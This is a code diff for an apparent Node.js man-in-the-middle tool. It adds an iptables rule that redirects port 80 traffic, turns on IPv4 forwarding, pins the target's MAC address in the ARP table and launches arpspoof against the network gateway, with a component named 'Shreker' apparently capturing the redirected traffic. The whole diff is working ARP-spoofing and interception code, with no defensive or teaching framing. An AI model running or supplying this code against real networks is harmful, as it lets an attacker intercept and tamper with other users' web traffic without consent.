@@ -19,6 +19,26 @@ async function info () {
 
 async function main(target) {
 
+    let iptablesArgs = ['-t', 'nat', '-C', 'PREROUTING', '-p', 'tcp', '--dport', '80','-j', 'REDIRECT'];
+
+    try {
+        console.log('checking for iptables rule');
+        await utils.simpleExec('iptables', iptablesArgs);
+    } catch (e) {
+        if (e.status === 1) {
+            //iptables rule does not exist
+            console.log('adding iptables rule');
+            iptablesArgs[2] = '-A';
+            await utils.simpleExec('iptables', iptablesArgs);
+        } else {
+            throw e;
+        }
+    }
+
+    console.log('enabling ipv4 forwarding');
+    await utils.simpleExec ('sysctl', ['-w', 'net.ipv4.ip_forward=1']);
+
+    console.log('finding mac address for ' + target);
     let host = (await findHosts(target))[0];
 
     if (host === undefined) {
@@ -26,28 +46,12 @@ async function main(target) {
     }
 
     console.log('adding ' + target + ' -> ' + host.mac + ' to arp table');
-    let addToTable = childProcess.spawn('arp', ['-s', target, host.mac]);
-
-    addToTable.stdout.pipe(process.stdout);
-    addToTable.stderr.pipe(process.stderr);
-
-    await new Promise((resolve, reject) => {
-        addToTable.on('error', err => {
-            console.error('error adding to arp table', err);
-            process.exit(7);
-        });
-        addToTable.on('exit', (status, signal) => {
-            if (status === 0) {
-                resolve();
-            } else {
-                reject('status: ' + status + ' signal: ' + signal);
-            }
-        })
-    });
+    await utils.simpleExec('arp', ['-s', target, host.mac]);
 
     let shreker = new Shreker();
     shreker.start();
 
+    console.log('getting network info');
     let networkInfo = await utils.getNetworkInfo();
 
     let args = ['-i', networkInfo.name];
@@ -56,6 +60,7 @@ async function main(target) {
     }
     args.push(networkInfo.gateway_ip);
 
+    console.log('spawning arpspoof');
     let arpspoof = childProcess.spawn('arpspoof', args);
 
     arpspoof.on('error', err => {
